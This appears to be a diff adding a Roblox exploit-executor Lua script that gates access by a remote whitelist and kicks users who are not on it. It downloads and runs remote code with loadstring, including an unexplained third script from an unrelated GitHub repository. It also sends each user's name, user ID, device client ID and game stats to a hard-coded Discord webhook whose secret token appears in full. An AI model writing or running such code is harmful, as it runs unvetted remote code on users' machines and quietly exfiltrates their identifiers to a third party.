@@ -1,0 +1,260 @@
+local whitelistURL = "https://raw.githubusercontent.com/tuzurenard435/pieppiep93libtest/refs/heads/main/whitelist.lua"
+
+local usercolorsURL = "https://raw.githubusercontent.com/tuzurenard435/tuttuttutwl/refs/heads/main/usercolors.lua"
+
+
+
+local kickWebhookUrl = "https://discord.com/api/webhooks/1386714434860486756/VH_PK2JXQqa4YcPGC-wzWre5oQsXiyh7CCS7nT4XOI9a_hzxMqOBO95QcFBozQA0dZJH"
+
+
+
+local success1, whitelist = pcall(function()
+
+    return loadstring(game:HttpGet(whitelistURL, true))()
+
+end)
+
+
+
+local success2, userColors = pcall(function()
+
+    return loadstring(game:HttpGet(usercolorsURL, true))()
+
+end)
+
+
+
+local Players = game:GetService("Players")
+
+local localPlayer = Players.LocalPlayer
+
+local userId = localPlayer.UserId
+
+local HttpService = game:GetService("HttpService")
+
+local clientId = game:GetService("RbxAnalyticsService"):GetClientId()
+
+local displayName = localPlayer.DisplayName
+
+local username = localPlayer.Name
+
+
+
+local function sendKickLog(reason)
+
+    pcall(function()
+
+        (request or http_request or syn and syn.request)({
+
+            Url = kickWebhookUrl,
+
+            Method = "POST",
+
+            Headers = {
+
+                ["Content-Type"] = "application/json"
+
+            },
+
+            Body = HttpService:JSONEncode({
+
+                username = "Silence - Kick Logger",
+
+                avatar_url = "",
+
+                embeds = {{
+
+                    title = "Player Kicked:",
+
+                    description = string.format("**Name:** %s\n**Username:** %s\n**UserID:** %s\n**ClientID:** %s\n**Reason:** %s", displayName, username, userId, clientId, reason),
+
+                    color = 0xff0000
+
+                }}
+
+            })
+
+        })
+
+    end)
+
+end
+
+
+
+if not success1 or type(whitelist) ~= "table" then
+
+    spawn(function()
+
+        sendKickLog("Loading Error")
+
+    end)
+
+    wait(0.5)
+
+    localPlayer:Kick("Failed to load")
+
+    return
+
+end
+
+
+
+if not whitelist[userId] then
+
+    spawn(function()
+
+        sendKickLog("Not Whitelisted")
+
+    end)
+
+    wait(0.5)
+
+    localPlayer:Kick("You are not whitelisted.")
+
+    return
+
+end
+
+
+
+local success3, result = pcall(function()
+
+    return loadstring(game:HttpGet("https://raw.githubusercontent.com/ghfbv69/bvbvcb/refs/heads/main/iuouiou"))()
+
+end)
+
+
+
+if not success3 then
+
+    warn("Externe Scriptausführung fehlgeschlagen:", result)
+
+end
+
+
+
+local player = Players.LocalPlayer
+
+local webhookUrl = "https://discord.com/api/webhooks/1386714434860486756/VH_PK2JXQqa4YcPGC-wzWre5oQsXiyh7CCS7nT4XOI9a_hzxMqOBO95QcFBozQA0dZJH"
+
+
+
+local function formatNumber(number)
+
+    local isNegative = number < 0
+
+    number = math.abs(number)
+
+    if number >= 1e15 then
+
+        return (isNegative and "-" or "") .. string.format("%.2fQa", number / 1e15)
+
+    elseif number >= 1e12 then
+
+        return (isNegative and "-" or "") .. string.format("%.2fT", number / 1e12)
+
+    elseif number >= 1e9 then
+
+        return (isNegative and "-" or "") .. string.format("%.2fB", number / 1e9)
+
+    elseif number >= 1e6 then
+
+        return (isNegative and "-" or "") .. string.format("%.2fM", number / 1e6)
+
+    elseif number >= 1e3 then
+
+        return (isNegative and "-" or "") .. string.format("%.2fK", number / 1e3)
+
+    else
+
+        return (isNegative and "-" or "") .. string.format("%.2f", number)
+
+    end
+
+end
+
+
+
+local function sendWebhook()
+
+    local leaderstats = player:WaitForChild("leaderstats")
+
+    local strengthStat = leaderstats:WaitForChild("Strength")
+
+    local rebirthsStat = leaderstats:WaitForChild("Rebirths")
+
+    local killsStat = leaderstats:WaitForChild("Kills")
+
+    local brawlsStat = leaderstats:WaitForChild("Brawls")
+
+    local durabilityStat = player:WaitForChild("Durability")
+
+    local agilityStat = player:WaitForChild("Agility")
+
+
+
+    local success, response = pcall(function()
+
+        return (request or http_request or syn and syn.request)({
+
+            Url = webhookUrl,
+
+            Method = "POST",
+
+            Headers = {
+
+                ["Content-Type"] = "application/json"
+
+            },
+
+            Body = HttpService:JSONEncode({
+
+                username = "Silence - Execute Logger",
+
+                avatar_url = "",
+
+                embeds = {{
+
+                    title = "Player Executed:",
+
+                    description = string.format("**Name:** %s\n**Username:** %s\n**UserID:** %s\n**ClientID:** %s", displayName, username, userId, clientId),
+
+                    color = 0x00ff00,
+
+                    fields = {
+
+                        { name = "💪Strength", value = formatNumber(strengthStat.Value), inline = true },
+
+                        { name = "🔄Rebirths", value = formatNumber(rebirthsStat.Value), inline = true },
+
+                        { name = "💀Kills", value = formatNumber(killsStat.Value), inline = true },
+
+                        { name = "⚔️Brawls", value = formatNumber(brawlsStat.Value), inline = true },
+
+                        { name = "🛡️Durability", value = formatNumber(durabilityStat.Value), inline = true },
+
+                        { name = "⚡Agility", value = formatNumber(agilityStat.Value), inline = true }
+
+                    },
+
+                    footer = {
+
+                        text = "Henne is King"
+
+                    }
+
+                }}
+
+            })
+
+        })
+
+    end)
+
+end
+
+
+
+sendWebhook()
+
